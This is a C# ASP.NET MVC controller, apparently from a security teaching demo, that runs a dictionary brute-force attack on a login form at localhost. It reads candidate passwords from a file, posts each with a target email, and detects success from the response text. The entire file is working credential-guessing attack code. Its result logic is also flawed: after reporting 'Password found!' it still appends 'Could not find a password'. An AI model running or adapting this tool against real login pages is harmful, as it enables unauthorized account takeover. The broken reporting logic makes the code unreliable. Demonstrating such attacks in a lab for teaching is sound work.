using Attacker.MyStore.Models;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Web;
using System.Web.Mvc;

namespace Attacker.MyStore.Controllers
{
    public class BruteForcerController : Controller
    {
        // GET: BruteForcer
        public ActionResult Index()
        {
            return View();
             
        }


        [HttpPost]
        public ActionResult Index(BruteForcerViewModel model)
        {
            if (ModelState.IsValid)
            {
                var logonPath = "http://localhost:44375/Account/Login";
                var email = model.Email;
                var result = new StringBuilder();
                result.AppendLine($"Testing Email:{email} at logon path:{logonPath}");
                var passwordsPath = Path.Combine(AppDomain.CurrentDomain.GetData("DataDirectory").ToString(), "Passwords.txt");
                using (var sr = new StreamReader(passwordsPath))
                {
                    string pwd;
                    while ((pwd = sr.ReadLine()) != null)
                    {
                        result.AppendLine($"Testing password:{pwd}");
                        var postData = string.Format($"Email={email}&Password={pwd}");

                        var req = (HttpWebRequest)WebRequest.Create(logonPath);
                        req.Method = "POST";

                        var byteArray = Encoding.UTF8.GetBytes(postData);
                        req.ContentType = "application/x-www-form-urlencoded";
                        req.ContentLength = byteArray.Length;
                        var dataStream = req.GetRequestStream();
                        dataStream.Write(byteArray, 0, byteArray.Length);
                        dataStream.Close();

                        string respBody;
                        try
                        {
                            using (var resp = (HttpWebResponse)req.GetResponse())
                            {
                                respBody = GetResponseBody(resp);
                            }
                        }
                        catch (WebException e)
                        {
                            respBody = GetResponseBody((HttpWebResponse)e.Response);
                        }

                        if (respBody.Contains("Incorrect username or password"))
                        {
                            result.AppendLine("Incorrect password");
                            result.AppendLine();
                        }
                        else
                        {
                            result.AppendLine("Password found!");
                            break;
                        }
                    }

                    result.AppendLine("Could not find a password");
                }
                ViewBag.BruteForcePasswordResult = result.ToString();
            }
            return View(model);
        }

        private static string GetResponseBody(HttpWebResponse resp)
        {
            using (var respStream = new StreamReader(resp.GetResponseStream()))
            {
                return respStream.ReadToEnd();
            }
        }
    }
}